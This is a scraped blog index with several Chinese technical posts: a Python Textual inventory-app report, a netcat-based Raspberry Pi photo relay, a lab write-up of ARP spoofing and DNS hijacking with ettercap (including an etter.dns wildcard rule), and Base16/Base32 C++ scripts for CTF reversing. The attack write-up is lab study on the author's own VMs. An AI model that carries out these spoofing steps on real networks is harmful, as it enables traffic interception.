GDNModalScreen { 674 align: center middle; 675 } 676 677 GDNModalScreen \u0026gt; Container { 678 border: thick $background; 679 background: $boost; 680 width: 25%; 681 height: 25%; 682 } 683 684 GDNModalScreen \u0026gt; Container \u0026gt; Label { 685 margin: 1 686 } 687 688 GDNModalScreen \u0026gt; Container \u0026gt; #url { 689 background: pink; 690 } 691 692 GDNModalScreen \u0026gt; Container \u0026gt; Button { 693 width: 100%; 694 height: auto; 695 dock: bottom; 696 margin: 1; 697 } 698 \u0026#34;\u0026#34;\u0026#34; 699 700 def compose(self): 701 with Container(): 702 yield Label(\u0026#34;Please visit my blog at\u0026#34;) 703 yield Label(\u0026#34;https://jackgdn.github.io\u0026#34;, id=\u0026#34;url\u0026#34;) 704 yield Button(\u0026#34;OK!\u0026#34;, variant=\u0026#34;success\u0026#34;) 705 706 def on_button_pressed(self): 707 self.dismiss() 708 709 710class ItemWidget(Widget): 711 712 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 713 ItemWidget { 714 align: center middle; 715 height: 3; 716 margin: 1; 717 } 718 \u0026#34;\u0026#34;\u0026#34; 719 720 name = reactive(\u0026#34;\u0026#34;) 721 unit_price = reactive(\u0026#34;\u0026#34;) 722 quantity = reactive(\u0026#34;\u0026#34;) 723 section = reactive(\u0026#34;\u0026#34;) 724 id_number = reactive(\u0026#34;\u0026#34;) 725 726 class Edit(Message): 727 def __init__(self, item): 728 super().__init__() 729 self.item = item 730 731 class Delete(Message): 732 def __init__(self, item): 733 super().__init__() 734 self.item = item 735 736 def __init__(self): 737 super().__init__() 738 self.name_label = Label(id=\u0026#34;name\u0026#34;) 739 self.unit_price_label = Label(id=\u0026#34;unit_price\u0026#34;) 740 self.quantity_label = Label(id=\u0026#34;quantity\u0026#34;) 741 self.section_label = Label(id=\u0026#34;section\u0026#34;) 742 self.id_number_label = Label(id=\u0026#34;ID\u0026#34;) 743 744 def compose(self): 745 with Horizontal(): 746 yield Button(\u0026#34;Edit\u0026#34;, id=\u0026#34;edit\u0026#34;, variant=\u0026#34;success\u0026#34;) 747 yield Label(\u0026#34; \u0026#34;) 748 yield Button(\u0026#34;Delete\u0026#34;, id=\u0026#34;delete\u0026#34;, variant=\u0026#34;error\u0026#34;) 749 yield Label(\u0026#34; \u0026#34;) 750 with Container(): 751 yield Label(Text(\u0026#34;Name: \u0026#34;, style=\u0026#34;italic\u0026#34;)) 752 yield self.name_label 753 with Container(): 754 yield Label(Text(\u0026#34;Unit Price: \u0026#34;, style=\u0026#34;italic\u0026#34;)) 755 yield self.unit_price_label 756 with Container(): 757 yield Label(Text(\u0026#34;Qty.: \u0026#34;, style=\u0026#34;italic\u0026#34;)) 758 yield self.quantity_label 759 with Container(): 760 yield Label(Text(\u0026#34;Section: \u0026#34;, style=\u0026#34;italic\u0026#34;)) 761 yield self.section_label 762 with Container(): 763 yield Label(Text(\u0026#34;ID: \u0026#34;, style=\u0026#34;italic\u0026#34;)) 764 yield self.id_number_label 765 766 def watch_name(self, name): 767 self.name_label.update(name) 768 769 def watch_unit_price(self, unit_price): 770 self.unit_price_label.update(unit_price) 771 772 def watch_quantity(self, quantity): 773 self.quantity_label.update(quantity) 774 775 def watch_section(self, section): 776 try: 777 self.section_label.update(section) 778 779 except Exception: 780 self.post_message(self.Delete(self)) 781 782 def watch_id_number(self, id_number): 783 self.id_number_label.update(id_number) 784 785 @on(Button.Pressed, \u0026#34;#edit\u0026#34;) 786 def edit_request(self): 787 self.post_message(self.Edit(self)) 788 789 @on(Button.Pressed, \u0026#34;#delete\u0026#34;) 790 def delete_request(self): 791 self.post_message(self.Delete(self)) 792 793 794class CommandProvider(Provider): 795 796 async def search(self, query): 797 app = self.app 798 commands = { 799 \u0026#34;Save Data\u0026#34;: (\u0026#34;Save data NOW in case you forget to do so.\u0026#34;, app.action_save_data), 800 \u0026#34;Change Password\u0026#34;: (\u0026#34;Change your password as you want.\u0026#34;, app.action_change_password), 801 \u0026#34;Toggle Light/Dark Mode\u0026#34;: (\u0026#34;Your eyes are valuable.\u0026#34;, app.action_toggle_light_dark_mode), 802 \u0026#34;Exit Program\u0026#34;: (\u0026#34;Say goodbye to IMA.\u0026#34;, app.exit), 803 \u0026#34;View Source Code\u0026#34;: (\u0026#34;Incredible!\u0026#34;, app.view_source_code), 804 \u0026#34;Visit Author\u0026#39;s Blog\u0026#34;: (\u0026#34;Welcome to visit author\u0026#39;s blog @ https://jackgdn.github.io\u0026#34;, app.visit_my_blog) 805 } 806 807 matcher = self.matcher(query) 808 for command in list(commands.keys()): 809 score = matcher.match(command) 810 if score \u0026gt; 0: 811 yield Hit( 812 score, 813 matcher.highlight(command), 814 commands[command][1], 815 help=commands[command][0] 816 ) 817 818 819class ExceptionAppCommandProvider(Provider): 820 821 async def search(self, query): 822 app = self.app 823 commands = { 824 \u0026#34;Toggle Light/Dark Mode\u0026#34;: (\u0026#34;Your eyes are valuable.\u0026#34;, app.action_toggle_light_dark_mode), 825 \u0026#34;Exit Program\u0026#34;: (\u0026#34;Say goodbye to IMA.\u0026#34;, app.exit), 826 \u0026#34;View Source Code\u0026#34;: (\u0026#34;Incredible!\u0026#34;, app.view_source_code), 827 \u0026#34;Visit Author\u0026#39;s Blog\u0026#34;: (\u0026#34;Welcome to visit author\u0026#39;s blog @ https://jackgdn.github.io\u0026#34;, app.visit_my_blog) 828 } 829 830 matcher = self.matcher(query) 831 for command in list(commands.keys()): 832 score = matcher.match(command) 833 if score \u0026gt; 0: 834 yield Hit( 835 score, 836 matcher.highlight(command), 837 commands[command][1], 838 help=commands[command][0] 839 ) 840 841 842class ItemApp(App): 843 844 COMMANDS = {CommandProvider} 845 BINDINGS = [ 846 Binding(key=\u0026#39;a\u0026#39;, action=\u0026#34;new_item\u0026#34;, description=\u0026#34;New\u0026#34;, key_display=\u0026#39;A\u0026#39;), 847 Binding(key=\u0026#39;s\u0026#39;, action=\u0026#34;save_data\u0026#34;, description=\u0026#34;Save\u0026#34;, key_display=\u0026#39;S\u0026#39;), 848 Binding(key=\u0026#39;v\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, description=\u0026#34;Data Table View\u0026#34;, key_display=\u0026#39;V\u0026#39;), 849 Binding(key=\u0026#39;c\u0026#39;, action=\u0026#34;change_password\u0026#34;, description=\u0026#34;Change Password\u0026#34;, key_display=\u0026#39;C\u0026#39;), 850 Binding(key=\u0026#39;l\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, description=\u0026#34;Read Log File\u0026#34;, key_display=\u0026#39;L\u0026#39;), 851 Binding(key=\u0026#39;d\u0026#39;, action=\u0026#34;toggle_light_dark_mode\u0026#34;, description=\u0026#34;Light/Dark Mode\u0026#34;, key_display=\u0026#39;D\u0026#39;), 852 Binding(key=\u0026#39;t\u0026#39;, action=\u0026#34;credits\u0026#34;, description=\u0026#34;Credits\u0026#34;, key_display=\u0026#39;T\u0026#39;), 853 Binding(key=\u0026#39;A\u0026#39;, action=\u0026#34;new_item\u0026#34;, show=False), 854 Binding(key=\u0026#39;S\u0026#39;, action=\u0026#34;save_data\u0026#34;, show=False), 855 Binding(key=\u0026#39;V\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, show=False), 856 Binding(key=\u0026#39;C\u0026#39;, action=\u0026#34;change_password\u0026#34;, show=False), 857 Binding(key=\u0026#39;L\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, show=False), 858 Binding(key=\u0026#39;D\u0026#39;, action=\u0026#34;toggle_light_dark_mode\u0026#34;, show=False), 859 Binding(key=\u0026#39;T\u0026#39;, action=\u0026#34;credits\u0026#34;, show=False), 860 Binding(key=\u0026#34;CTRL+C\u0026#34;, action=\u0026#34;exit_program\u0026#34;, description=\u0026#34;Exit\u0026#34;, key_display=\u0026#34;^C\u0026#34;) 861 ] 862 863 @work 864 async def on_mount(self): 865 if getsize(\u0026#34;logininfo\u0026#34;) \u0026lt; 1: 866 if await self.push_screen_wait(LoginModalScreen(LoginStatus.FIRST_TIME_LOGIN)): 867 self.load_data() 868 else: 869 self.exit() 870 else: 871 if await self.push_screen_wait(LoginModalScreen(LoginStatus.REQUEST_LOGIN)): 872 self.load_data() 873 else: 874 self.exit() 875 876 def compose(self): 877 yield Header(show_clock=True) 878 yield Footer() 879 880 def action_new_item(self): 881 self.push_screen(ItemModalScreen(), self.new_item_callback) 882 883 def action_save_data(self): 884 data_dump = [(\u0026#34;Name\u0026#34;, \u0026#34;Unit Price\u0026#34;, \u0026#34;Quantity\u0026#34;, \u0026#34;Section\u0026#34;, \u0026#34;ID\u0026#34;)] + \\ 885 [(item.name, item.unit_price, item.quantity, item.section, item.id_number) for item in self.query(ItemWidget)] 886 try: 887 with open(\u0026#34;data.tsv\u0026#34;, \u0026#39;w\u0026#39;, newline=\u0026#34;\u0026#34;) as data: 888 writer = csv.writer(data, delimiter=\u0026#39;\\t\u0026#39;) 889 for row in data_dump: 890 writer.writerow(row) 891 self.push_screen(AlertModalScreen(\u0026#34;File saved!\u0026#34;)) 892 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as logfile: 893 logfile.write(f\u0026#34;Save data at {asctime()}\\n\u0026#34;) 894 895 except Exception: 896 self.push_screen(AlertModalScreen(\u0026#34;Failed to save data.\u0026#34;)) 897 898 @work(thread=True) 899 def load_data(self): 900 self.file_size = getsize(\u0026#34;ItemManagementApp.py\u0026#34;) 901 try: 902 data_load = [] 903 with open(\u0026#34;data.tsv\u0026#34;, \u0026#39;r\u0026#39;, newline=\u0026#34;\u0026#34;) as data: 904 reader = csv.reader(data, delimiter=\u0026#39;\\t\u0026#39;) 905 for row in reader: 906 data_load.append(row) 907 data_load = data_load[1:] 908 for name, unit_price, quantity, section, id_number in data_load: 909 item = ItemWidget() 910 item.name = name 911 item.unit_price = unit_price 912 item.quantity = quantity 913 item.section = section 914 item.id_number = id_number 915 self.call_from_thread(self.mount, item) 916 917 except Exception: 918 self.push_screen(AlertModalScreen(\u0026#34;Fialed to load data.\u0026#34;)) 919 920 def action_toggle_datatable_view(self): 921 data_dump = [(\u0026#34;Name\u0026#34;, \u0026#34;Unit Price\u0026#34;, \u0026#34;Quantity\u0026#34;, \u0026#34;Section\u0026#34;, \u0026#34;ID\u0026#34;)] + \\ 922 [(item.name, item.unit_price, item.quantity, item.section, item.id_number) for item in self.query(ItemWidget)] 923 self.push_screen(DataTableScreen(data_dump)) 924 925 def action_change_password(self): 926 self.push_screen(LoginModalScreen(LoginStatus.REQUEST_CHANGE_PASSWORD)) 927 928 def action_read_log_file(self): 929 self.push_screen(LogScreen()) 930 931 def action_credits(self): 932 self.push_screen(CreditsScreen()) 933 934 def action_toggle_light_dark_mode(self): 935 self.dark = not self.dark 936 937 def action_exit_program(self): 938 self.exit() 939 940 def new_item_callback(self, data): 941 item = ItemWidget() 942 name, unit_price, quantity, section, id_number = data 943 item.name = name 944 item.unit_price = unit_price 945 item.quantity = quantity 946 item.section = section 947 item.id_number = id_number 948 self.mount(item) 949 950 def edit_item_callback(self, item, data): 951 name, unit_price, quantity, section, id_number = data 952 item.name = name 953 item.unit_price = unit_price 954 item.quantity = quantity 955 item.section = section 956 item.id_number = id_number 957 958 def on_item_widget_edit(self, message): 959 self.push_screen(ItemModalScreen(), partial(self.edit_item_callback, message.item)) 960 961 def on_item_widget_delete(self, message): 962 message.item.remove() 963 964 def view_source_code(self): 965 self.push_screen(SourceCodeScreen(round(int(self.file_size) / 1024, 2))) 966 967 def visit_my_blog(self): 968 self.push_screen(GDNModalScreen()) 969 970 971class ExceptionApp(App): 972 973 COMMANDS = {ExceptionAppCommandProvider} 974 BINDINGS = [ 975 Binding(key=\u0026#39;d\u0026#39;, action=\u0026#34;toggle_light_dark_mode\u0026#34;, description=\u0026#34;Light/Dark Mode\u0026#34;, key_display=\u0026#39;D\u0026#39;), 976 Binding(key=\u0026#39;t\u0026#39;, action=\u0026#34;credits\u0026#34;, description=\u0026#34;Credits\u0026#34;, key_display=\u0026#34;T\u0026#34;), 977 Binding(key=\u0026#34;CTRL+C\u0026#34;, action=\u0026#34;exit_program\u0026#34;, description=\u0026#34;Exit\u0026#34;, key_display=\u0026#34;^C\u0026#34;), 978 Binding(key=\u0026#39;V\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, show=False), 979 Binding(key=\u0026#39;T\u0026#39;, action=\u0026#34;credits\u0026#34;, show=False) 980 ] 981 982 def on_mount(self): 983 self.file_size = getsize(\u0026#34;ItemManagementApp.py\u0026#34;) 984 self.push_screen(AlertModalScreen(\u0026#34;Failed to load data. Please check if you have permission.\u0026#34;)) 985 986 def compose(self): 987 yield Header(show_clock=True) 988 yield Footer() 989 990 def action_toggle_light_dark_mode(self): 991 self.dark = not self.dark 992 993 def action_credits(self): 994 self.push_screen(CreditsScreen()) 995 996 def action_exit_program(self): 997 self.exit() 998 999 def view_source_code(self): 1000 self.push_screen(SourceCodeScreen(round(int(self.file_size) / 1024, 2))) 1001 1002 def visit_my_blog(self): 1003 self.push_screen(GDNModalScreen()) 1004 1005 1006def main(): 1007 try: 1008 if not exists(\u0026#34;data.tsv\u0026#34;): 1009 with open(\u0026#34;data.tsv\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as _: 1010 pass 1011 chmod(\u0026#34;data.tsv\u0026#34;, 0o600) 1012 if not exists(\u0026#34;logininfo\u0026#34;): 1013 with open(\u0026#34;logininfo\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as _: 1014 pass 1015 chmod(\u0026#34;logininfo\u0026#34;, 0o600) 1016 if not exists(\u0026#34;IMA.log\u0026#34;): 1017 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as _: 1018 pass 1019 chmod(\u0026#34;IMA.log\u0026#34;, 0o600) 1020 chmod(\u0026#34;ItemManagementApp.py\u0026#34;, 0o644) 1021 app = ItemApp() 1022 app.title = \u0026#34;Item Management App\u0026#34; 1023 app.run() 1024 1025 except Exception: 1026 app = ExceptionApp() 1027 app.title = \u0026#34;Item Management App\u0026#34; 1028 app.sub_title = \u0026#34;Encountered Errors\u0026#34; 1029 app.run() 1030 1031 1032if __name__ == \u0026#39;__main__\u0026#39;: 1033 main() 代码解读 类 功能 LoginStatus 存储登录状态以及不同登录状态下 LoginModalScreen 显示内容的常量。 AlertModalScreen 显示弹窗，接收一个参数 alert_message 存储显示的消息。 ItemModalScreen 添加或修改商品信息的界面。 LoginModalScreen 注册、登录及修改密码共同使用的界面。显示的提示信息存储在 LoginStatus 类中。 DataTableScreen 将数据以表格视图显示，可以以不同列为依据对数据排序。 LogScreen 日志界面。 CreditsScreen 作者名单。 ItemWidget 在主界面展示商品信息的组件。 CommandProvider 存储命令托盘中的命令，允许用户搜索命令。 ExceptionAppCommandProvider ExceptionApp 下的命令托盘。 ItemApp 程序的主界面，调控整个程序运行的核心。 ExceptionApp 在程序缺少文件读写权限时运行，用于提醒用户权限不足并拒绝操作。 问题及未来改进 完善功能，尤其是数据处理方面的功能。作者在学习相应内容以及编写程序时时侧重于对该 TUI 模块的运用而非对数据的处理上，因此程序只有最基本的处理数据的功能，而更复杂的数据处理功能也因为时间问题和作者自身能力问题没有被实现。 界面及代码优化。由于作者能力有限以及 Textual 模块自身的不完善，有些代码显得格外冗余（例如 Binding() 的重复使用。在作者完成代码编写时，这样重复仍然是修改不同 Screen 中 Footer 组件所对应 BINDINGS 的唯一方法），也有些功能没有实现（例如作者曾尝试在登录失败时弹出一个 AlertModalScreen 但是 ModalScreen 类中并没有 push_screen() 方法；尝试使用回调函数实现的时候，ItemApp 类的 compose 方法定义为了一个异步方法，又由于作者对多线程编程了解甚少，最终的尝试也以失败告终）。未来作者希望通过学习消除这些遗憾。 增加多用户模式。目前程序只允许一位用户使用，在增加多用户模式会使程序的演示效果更强，这需要添加权限管理模块以及数据存储模式、日志记录模式和登录逻辑的全面重写。 添加自动保存功能。其实这个功能并不复杂，只需在用户每次执行完增加、修改、删除操作后将文件存储到一个 autosave 文件中去。但是这样做，日志的作用就会大大降低，并且在 ItemApp 类的异步方法 compose() 中重复调用 push_screen_wait() 方法会使程序出现意想不到的 bug（只有在将 compose() 方法声明为一个异步方法才能够调用 push_screen_wait() 方法，这些 bug 也许是因为作者对多线程的了解过于浅薄导致的）。 优化项目管理措施。就本项目来说，毕竟这是一项作业，将所有代码都放在一个脚本中无可厚非。但是在实际生产环境中，这样做有悖于模块化编程的原则，是一种极其愚蠢的做法：此行为不利于后期代码维护。当作者把代码写到 600 行左右（作者甚至把控制样式的 CSS 塞了进去，然而这完全没有必要，还会显得臃肿）时就已经感受到这个问题了，当作者需要添加或者修改某一个功能时，就要在文件中不停上下翻找。虽然 VSCode 可以拆分编辑器，但是为程序添加一个功能可能需要对多个模块进行修改（例如添加日志记录功能时，数据读写、登录等模块的代码都需要做出修改），依然会降低效率。这样做对于 debug 和程序出现问题后版本回溯也极不友好。 相关链接 Python3 Tetxual \u0026gt;\u0026gt; textual · PyPI Textual 文档 \u0026gt;\u0026gt; Textual Textual 讲解视频 \u0026gt;\u0026gt; Textualize - Youtube Pandoc \u0026gt;\u0026gt; Pandoc - index ","link":"https://jackgdn.github.io/post/python-%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/","section":"post","tags":["Python"],"title":"Python 课程设计项目报告"},{"body":"前段时间 wanqian 师傅添置了一台树莓派作为服务器连接到实验室的内网网络环境中。这台树莓派上安装了 Ubuntu 操作系统并装有一个摄像头模块，可以使用 fswebcam 命令控制摄像头拍照。不过遗憾的是，树莓派上没有图形化界面，如果想要查看图片就必须将图片传输到其他设备上；树莓派上的相机模块是反的，要是想正常查看需要将图片旋转 180°；树莓派在一个内网环境中，如果我想在宿舍里连接树莓派则需要每天交 1 元钱网费。\n拍照、旋转、上传 wanqian 师傅出于安全性的考虑，不希望我使用内网穿透控制树莓派拍照。所以，我只能让树莓派与我的云服务器单线联系。因此我想到让树莓派检测云服务器上的某个端口是否开放，若开放则自动执行拍照上传等一系列命令，所以有了下面一个脚本（路径为 /home/gdn/gwc/agwc.sh。下文为便于叙述，树莓派用 R 表示，云服务器用 S 表示，个人计算机用 PC 表示）:\n1#!/bin/bash 2CONN=\u0026#39;nc -zv IP_S 8963\u0026#39; 3while true 4do 5 if $CONN ; then 6 time=$(date +\u0026#34;%Y-%m-%d_%H-%M-%S\u0026#34;) 7 fswebcam --no-banner -r 1920x1080 /home/gdn/gwc/fagwc/$time.jpg 8 convert /home/gdn/gwc/fagwc/$time.jpg -rotate 180 /home/gdn/gwc/fagwc/$time.jpg 9 nc -v IP_S 8965 \u0026lt; /home/gdn/gwc/fagwc/$time.jpg 10 fi 11 sleep 10 12done 该脚本在 R 上运行，每隔十秒钟就会检测一次 S 的 8963 端口是否开放，如果开放，则使用 fswebcam 命令拍照，使用 convert 命令（在 ImageMagisk 工具集中）旋转图片并将图片使用 netcat 传输到 S 的 8965 端口上去。由于 netcat 连接特性，开放两个端口是必需的。另外，#! 的shebang 不能缺失，因为如果我们想将它写入 .service 文件自动运行，shebang 可以告诉计算机执行该脚本的解释器是什么。\n利用 systemd 自动执行 下面的服务文件（路径为 /etc/systemd/system/agwc.service）用于自动执行该脚本：\n1[Unit] 2Description=Autonomous Gideon-watching Client 3After=NetworkManager.service 4 5[Service] 6ExecStart=/home/gdn/gwc/agwc.sh 7 8[Install] 9WantedBy=multi-user.target 有了这个脚本，前面的 agwc.sh 就会在开机后自动运行。只需执行 sudo systemctl daemon-reload 与 sudo systemctl enable agwc.service，在下次树莓派开机时，这个服务就可以自动运行了。\n配置服务器接受图片 下面需要配置服务端，需要让 S 能在我需要的时候开放端口，接收图片然后关闭端口。下面这一脚本的路径为 /home/USER_S/gdnwatch.sh\n1sudo firewall-cmd --zone=public --add-port=8963/tcp --permanent 2sudo firewall-cmd --zone=public --add-port=8965/tcp --permanent 3sudo firewall-cmd --reload 4time=$(date +\u0026#34;%Y-%m-%d_%H-%M-%S\u0026#34;) 5nc -vl 8963 \u0026amp; 6nc -vl 8965 \u0026gt; ~/pictures/$time.jpg \u0026amp; 7sleep 10 8ps aux | grep \u0026#39;nc -vl 8963\u0026#39; | grep -v grep | awk \u0026#39;{print $2}\u0026#39; | xargs kill -9 9ps aux | grep \u0026#39;nc -vl 8965\u0026#39; | grep -v grep | awk \u0026#39;{print $2}\u0026#39; | xargs kill -9 10sudo firewall-cmd --zone=public --remove-port=8963/tcp --permanent 11sudo firewall-cmd --zone=public --remove-port=8965/tcp --permanent 12sudo firewall-cmd --reload 13find ./pictures/ -size -1b -exec rm {} \\; 这一脚本在 S 上运行。脚本首先将 8963 与 8965 端口打开并监听这两个端口并等待十秒，这两个端口分别用于标志和接受文件。接收到文件后，脚本会将两个 netcat 进程关闭以便于下次能够继续使用 netcat 监听这两个端口。再然后，关闭 8963 与 8965 两个端口。在某些情况下（例如 R 没有开机），S 接收不到任何信息并创建一个空文件，这时就需要将文件大小小于 1B 的图片删除。\n传输到个人计算机上浏览图片 进行到这一步，只剩下最后一个问题没有解决，就是浏览图片。S 上没有远程桌面，我不能在 S 上查看这些图片，我只能再将图片传输到 PC 上查看。因此，我们在 PC 上创建下面这个脚本（get-pictures.cmd，在 Linux 系统上将后缀改为 .sh 同样可以运行）：\n1ssh USER_S@IP_S \u0026#34;bash ~/gdnwatch.sh\u0026#34; 2sftp USER_S@IP_S:pictures/* C:\\Users\\jack_gdn\\Pictures\\Raspberry-Pi\\pictures\\ 3ssh USER_S@IP_S \u0026#34;find ~/pictures/ -name \u0026#39;*.*\u0026#39; -exec rm {} \\;\u0026#34; 这个脚本控制 S 运行 gdnwatch.sh 脚本，随后自动将图片传输回 PC，并且删除 S 上的图片缓存以节省存储空间。\n至此，我只需要在 PC 上运行 get-pictures.cmd 脚本就可以坐等图片传输回 PC 了。当然，既然使用了 SSH 与 SFTP，那么 ssh-genkey -t rsa 与 ssh-copy-id 实现免密码登录必不可少。上面这种远程拍照方式会使 S 每月额外消耗大约 170M 流量。\n","link":"https://jackgdn.github.io/post/nat/","section":"post","tags":["Linux"],"title":"远程控制一台在内网中的设备"},{"body":"","link":"https://jackgdn.github.io/tags/penetration/","section":"tags","tags":null,"title":"Penetration"},{"body":"前置知识 用较为生动的语言来讲，我们把网络类比成一间屋子，屋子里坐着的每一个人都是一台主机，每个人都有自己的编号（IP 地址）和位置（MAC 地址）。假如说屋子里的 A 需要和 B 通信，A 已知 B 的编号为 13 但是不知道 B 的位置，因此 A 无法和 B 通信。此时 A 会在屋子里大喊“谁的编号是 13”并等待 B 的回复。正常来说，除了 B 以外其他人会对 A 的请求视而不见，只有 B 收到 A 的请求后将自己的位置告诉 A，随后两人就可以开始通信。\n但是，这是出现了一个不怀好意的 C，当 A 发送请求的时候，C 就拼命地给 A 回复“我就是 13 号”以至于 A 根本听不到 B 给他的回复，因此 A 就会把 C 当作 B 并与之通信，C 便可以借机充当中间人实施攻击。\n动手尝试 攻击前准备 本次攻击尝试中，攻击机与靶机均为使用 NAT 模式连接物理机的虚拟机。这样既可以使两台虚拟机连接到外部网络，又不会在攻击过程中造成流量泄露。\n攻击机配置\n操作系统：Kali Linux IPv4 地址：192.168.107.135 MAC 地址：00:0c:29:62:a9:97 靶机配置\n操作系统：Windows 10 IPv4 地址：192.168.107.139 MAC 地址：00:0C:29:B6:7E:52 网关配置\nIPv4 地址：192.168.107.2 MAC 地址：00:50:56:f2:3a:1f 在开始攻击前，使用 arp -a 命令查看靶机 ARP 缓存中的 MAC 地址。此时，靶机中记录的 MAC 地址为正确的地址，测试用网址 example.com 也能够正常访问。\nARP 欺骗 在攻击机中使用 ettercap 工具，该工具可用于执行多种形式的中间人攻击，本次 ARP 欺骗以及 DNS 劫持都需要用到该工具。sudo ettercap -G 命令可用于打开该工具的图形化界面。\n首先扫描局域网下的存活主机，并将网关作为 Target 1, 靶机作为 Target 2：\n此时选择 ARP Poisoning 选项进行 ARP 欺骗攻击。这时再使用 arp -a 查看靶机上的 ARP 缓存就会发现，网关的 MAC 地址已经变成了攻击机的 MAC 地址。此时靶机再访问任何外界网站，流量都会首先通过攻击机。\nDNS 劫持 在进行 DNS 劫持中，ettercap 会将攻击机作为一台伪 DNS 解析服务器，向靶机发送虚假的服务器地址。首先修改 /etc/ettercap/etter.dns 文件来添加规则。例如说，我们在文件中添加一行 * A 127.0.0.1，则 ettercap 会对靶机发送的任何解析域名请求返回本机回环地址 127.0.0.1。\n修改好后，启用 ettercap 的 dns_spoof 插件进行 DNS 劫持攻击。\n这时就能发现，靶机断网了，因为任何通过域名访问外界的请求，都会被解析成 127.0.0.1。\n但是不经过域名解析，直接使用 IP 地址连接的服务器则不受影响。\n","link":"https://jackgdn.github.io/post/mitm-attack/","section":"post","tags":["Penetration"],"title":"记一次 ARP 欺骗 + DNS 劫持攻击的尝试"},{"body":"","link":"https://jackgdn.github.io/categories/%E6%B8%97%E9%80%8F/","section":"categories","tags":null,"title":"渗透"},{"body":"","link":"https://jackgdn.github.io/tags/reverse/","section":"tags","tags":null,"title":"Reverse"},{"body":"","link":"https://jackgdn.github.io/categories/%E9%80%86%E5%90%91/","section":"categories","tags":null,"title":"逆向"},{"body":" Base16 [已完成] Base32 [已完成] Base64 UUencode XXencode [已完成] Base58 (Python 实现) [已完成] TEA XTEA [已完成] XXTEA [已完成] RC4 [已完成] RC5 [队列中] SM4 [队列中] AES [队列中] DES 3DES [队列中] Blowfish [队列中] Chacha20 [队列中] Rabbit [队列中] RSA [队列中] MD5 [队列中] SHA256 [队列中] CRC32 [队列中] 有一个 IDA 插件叫做 Findcrypt, 其工作原理是寻找“关键值”，例如 TEA 加密的 DELTA、AES 加密的 S 盒、MD5 算法的状态变量。出于安全性的原因，这些值在算法里都是被规定好不能更改的。但是万恶的出题人可不管这些，如果这些值被修改，Findcrypt 就不好用了。因此我打算做这个脚本库。\n除特别说明，本文中的脚本均使用 C++ 编写，使用 VC++ 编译器，以便于在遇到“魔改”算法题目时可直接修改。\n编码 Base16 实际上 Base16 编码就是将每个字符的十六进制打印出来。但是既然是一种编码，就要考虑在题目中变表的可能。\n编码脚本：\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;cstring\u0026gt; 3#include \u0026lt;sstream\u0026gt; 4 5using namespace std; 6 7string dec2hex(int deci) 8{ 9\tstringstream ss; 10\tss \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; deci; 11\treturn ss.str(); 12} 13 14int hex2dec_onebyte(char hexi) 15{ 16\tstringstream ss; 17\tss \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; hexi; 18\tint deci; 19\tss \u0026gt;\u0026gt; deci; 20\treturn deci; 21} 22 23int main() 24{ 25\tstring table = \u0026#34;0123456789ABCDEF\u0026#34;; // 编码表 26\tchar tmp0, tmp1; 27\tint index0, index1; 28\tstring cipher = \u0026#34;\u0026#34;; 29 30\tstring message; 31\tcin \u0026gt;\u0026gt; message; 32 33\tfor (int i = 0; i \u0026lt; strlen(data(message)); i++) 34\t{ 35\ttmp0 = dec2hex(int(message[i]))[0]; 36\ttmp1 = dec2hex(int(message[i]))[1]; 37\tindex0 = hex2dec_onebyte(tmp0); 38\tindex1 = hex2dec_onebyte(tmp1); 39\tcipher = cipher + table[index0] + table[index1]; 40\t} 41 42\tcout \u0026lt;\u0026lt; cipher; 43\treturn 0; 44} 解码脚本：\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;cstring\u0026gt; 3#include \u0026lt;sstream\u0026gt; 4 5using namespace std; 6 7char dec2chr(int hi4bits, int lo4bits) 8{ 9\treturn char((hi4bits \u0026lt;\u0026lt; 4) + lo4bits); 10} 11 12int main() 13{ 14\tstring table = \u0026#34;0123456789ABCDEF\u0026#34;; // 编码表 15\tint tmp0, tmp1; 16\tstring message = \u0026#34;\u0026#34;; 17 18\tstring cipher; 19\tcin \u0026gt;\u0026gt; cipher; 20 21\tfor (int i = 0; i \u0026lt; strlen(data(cipher)); i += 2) 22\t{ 23\ttmp0 = table.find(cipher[i]); 24\ttmp1 = table.find(cipher[i + 1]); 25\tmessage = message + dec2chr(tmp0, tmp1); 26\t} 27 28\tcout \u0026lt;\u0026lt; message; 29\treturn 0; 30} 特征：十六位编码表。\nBase32 1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;cstring\u0026gt; 3#include \u0026lt;bitset\u0026gt; 4#include \u0026lt;cmath\u0026gt; 5 6using namespace std; 7 8string paddingeq(string cipher, string binstr) 9{ 10\tint pad = (40 - (strlen(data(binstr)) % 40)) / 5; 11\tfor (int i = 0; i \u0026lt; pad; i++) 12\t{ 13\tcipher += \u0026#39;=\u0026#39;; 14\t} 15\treturn cipher; 16} 17 18string padding0(string binstr) 19{ 20\tint pad = 5 - (strlen(data(binstr)) % 5); 21\tfor (int i = 0; i \u0026lt; pad; i++) 22\t{ 23\tbinstr += \u0026#39;0\u0026#39;; 24\t} 25\treturn binstr; 26} 27 28string str2binstr(string message) 29{ 30\tstring binstr = \u0026#34;\u0026#34;; 31\tfor (auto i : message) 32\t{ 33\tbitset\u0026lt;8\u0026gt; bits(i); 34\tbinstr += bits.to_string(); 35\t} 36\treturn binstr; 37} 38 39int main() 40{ 41\tstring table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567\u0026#34;; // 编码表 42\tstring binstr; 43\tstring cipher = \u0026#34;\u0026#34;; 44\tint index; 45 46\tstring message; 47\tcin \u0026gt;\u0026gt; message; 48 49\tbinstr = str2binstr(message); // 转为二进制字符串 50\tif (strlen(data(binstr)) % 5 != 0) // 填充 0 51\t{ 52\tbinstr = padding0(binstr); 53\t} 